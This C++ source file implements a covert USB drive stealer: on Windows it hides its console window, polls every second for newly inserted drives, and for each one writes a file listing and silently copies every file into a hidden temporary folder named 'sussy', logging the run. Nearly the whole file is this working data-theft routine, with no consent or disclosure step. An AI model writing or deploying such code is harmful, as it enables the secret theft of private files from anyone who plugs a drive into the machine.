#include "DetectDrives.hpp"
#include "ID.hpp"
#include <bitset>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <spdlog/sinks/basic_file_sink.h>
#include <spdlog/spdlog.h>
#include <thread>

#define USE_STD_FS_COPY 0

#ifdef PLATFORM_WINDOWS
    #include <Windows.h>
#endif

namespace fs = std::filesystem;

void copy_files(fs::path drive_path, fs::path out_path);
void dump_tree(fs::path in_path, fs::path out_file);
void initialize_logger();

#if !USE_STD_FS_COPY
void copy_dir(fs::path src, fs::path out);
#endif

const static fs::path work_dir = fs::temp_directory_path() / "sussy";
Ref<spdlog::logger> logger;

int main() {

#ifdef PLATFORM_WINDOWS
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
#endif

    fs::create_directories(work_dir);
    initialize_logger();
    logger->info("Init was successful, starting now.");

    while (true) {
        using namespace std::chrono_literals;
        std::this_thread::sleep_for(1s);

        logger->trace("Looking for devices...");

        if (auto path = get_new_drive_path()) {
            auto drive_path = path.value();

            ID id;
            logger->warn("{} was found! Assigned ID is {}",
                         drive_path.generic_string(), id);
            fs::path out_path = work_dir / id.ToString();
            fs::create_directories(out_path);

            dump_tree(drive_path, out_path / "tree_dump.txt");
            copy_files(drive_path, out_path);
        }
    }

    return 0;
}

void dump_tree(fs::path in_path, fs::path out_file) {
    logger->info("Dumping tree");
    std::ofstream dump(out_file);

    for (const fs::directory_entry &entry :
         fs::recursive_directory_iterator(in_path)) {

        if (entry.is_regular_file())
            dump << entry.path().generic_string() << std::endl;
    }
    logger->info("Tree dump completed");
}

void copy_files(fs::path drive_path, fs::path out_path) {
    logger->info("Copying to {}", out_path.generic_string());

    try {

#if USE_STD_FS_COPY
        auto options =
            fs::copy_options::recursive | fs::copy_options::update_existing;
        fs::copy(drive_path, out_path, options);
#else
        copy_dir(drive_path, out_path);
#endif
        logger->info("Done!");
    } catch (...) {
        logger->error("Copy was interrupted, trying to save progress");
        auto out_file = out_path / "recovery_dump.txt";
        dump_tree(out_path, out_file);
        logger->info("Progress was saved to {}", out_file.generic_string());
    }
}

void initialize_logger() {
#ifdef PLATFORM_WINDOWS
    logger = spdlog::basic_logger_st("logger", (work_dir / "log.txt").string());
#else
    logger = spdlog::basic_logger_st("logger", (work_dir / "log.txt"));
#endif

    logger->set_level(spdlog::level::trace);
    logger->flush_on(spdlog::level::trace);
}

#if !USE_STD_FS_COPY
void copy_dir(fs::path src, fs::path out) {

    for (const fs::directory_entry &entry :
         fs::recursive_directory_iterator(src)) {

        auto out_path = out / entry.path().lexically_relative(src);

        if (entry.is_directory()) {
            logger->trace("Creating {} to {}", entry.path().generic_string(),
                          out_path.generic_string());
            try {
                fs::create_directories(out_path);
            } catch (...) {
                logger->error("Failed to create directory {}",
                              out_path.generic_string());
            }
        }

        if (entry.is_regular_file()) {
            logger->trace("Copying {} to {} (size: {})",
                          entry.path().generic_string(),
                          out_path.generic_string(), entry.file_size());

            try {
                fs::copy_file(entry.path(), out_path);
            } catch (...) {
                logger->error("Failed to copy {}",
                              entry.path().generic_string());
            }
        }
    }
}
#endif
